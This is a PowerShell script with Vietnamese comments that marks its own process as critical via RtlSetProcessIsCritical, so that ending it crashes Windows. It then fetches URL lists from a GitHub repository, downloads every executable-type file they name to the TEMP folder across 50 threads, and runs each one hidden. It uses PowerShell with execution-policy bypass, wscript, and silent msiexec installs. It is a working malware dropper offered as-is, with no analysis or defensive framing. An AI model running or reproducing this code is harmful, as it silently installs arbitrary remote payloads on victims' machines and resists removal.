function CriticalProcess {
    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
    [System.Diagnostics.Process]::EnterDebugMode() 
    $domain = [AppDomain]::CurrentDomain
    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $module = $assembly.DefineDynamicModule('DynamicModule')
    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
        [System.Runtime.InteropServices.CallingConvention]::Winapi,
        [System.Runtime.InteropServices.CharSet]::Ansi)
    $type = $typeBuilder.CreateType()
    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
    function InvokeRtlSetProcessIsCritical {
        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
    }
    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
    }
    else {
        Write-Host "Unknown method name: $MethodName"
    }
}
CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
# 1. Nguồn URL từ list bạn đã check
$sources = @(
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
    "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/urls.txt"
)

# Extension hỗ trợ
$extensions = ".exe", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh", ".msc", ".msi", ".msp", ".scr", ".ps1", ".pif", ".cpl"

Write-Host "[*] Đang thu thập và lọc trùng từ GitHub..." -ForegroundColor Cyan

# Cách lấy dữ liệu an toàn, tránh lỗi Empty Pipe
$allUrls = @()
foreach ($s in $sources) {
    try {
        $content = (Invoke-WebRequest -Uri $s -UseBasicParsing -TimeoutSec 10).Content
        if ($content) {
            $allUrls += $content -split "`n" | ForEach-Object { $_.Trim() }
        }
    } catch { }
}

# Lọc trùng và kiểm tra đuôi file hợp lệ
$finalList = $allUrls | Where-Object { 
    $url = $_
    $url -ne "" -and ($extensions | Where-Object { $url.ToLower().EndsWith($_) })
} | Select-Object -Unique

Write-Host "[*] Tổng cộng $($finalList.Count) link duy nhất. Đang chạy 50 tầng (threads)..." -ForegroundColor Green

# 2. Thiết lập Runspace Pool (Multi-threading)
$sessionState = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
$pool = [runspacefactory]::CreateRunspacePool(1, 50, $sessionState, $Host)
$pool.Open()
$threads = New-Object System.Collections.Generic.List[PSObject]

# 3. Đẩy tác vụ vào luồng
foreach ($u in $finalList) {
    $powershell = [powershell]::Create().AddScript({
        param($url)
        try {
            # Xử lý tên file và đường dẫn TEMP
            $cleanUrl = $url.Split('?')[0]
            $fileName = [System.IO.Path]::GetFileName($cleanUrl)
            $path = Join-Path $env:TEMP $fileName
            $ext = [System.IO.Path]::GetExtension($path).ToLower()
            
            # Tải xuống
            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
            
            # Logic thực thi theo loại file
            switch ($ext) {
                ".ps1" { 
                    Start-Process "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden 
                }
                { ".vbs", ".js", ".vbe", ".jse", ".wsf", ".wsh" -contains $_ } { 
                    Start-Process "wscript.exe" -ArgumentList "`"$path`"" -WindowStyle Hidden 
                }
                { ".msi", ".msp" -contains $_ } { 
                    Start-Process "msiexec.exe" -ArgumentList "/i `"$path`" /quiet /qn" -WindowStyle Hidden 
                }
                default { 
                    Start-Process -FilePath $path -WindowStyle Hidden 
                }
            }
        } catch { }
    }).AddArgument($u)

    $powershell.RunspacePool = $pool
    $threads.Add((New-Object PSObject -Property @{
        Instance = $powershell
        Handle   = $powershell.BeginInvoke()
    }))
}

# 4. Giám sát cho đến khi xong
while ($threads.Handle.IsCompleted -contains $false) { Start-Sleep -Milliseconds 200 }

# 5. Giải phóng
foreach ($t in $threads) {
    $t.Instance.EndInvoke($t.Handle)
    $t.Instance.Dispose()
}
$pool.Close()
Write-Host "[+] HOÀN TẤT!" -ForegroundColor White
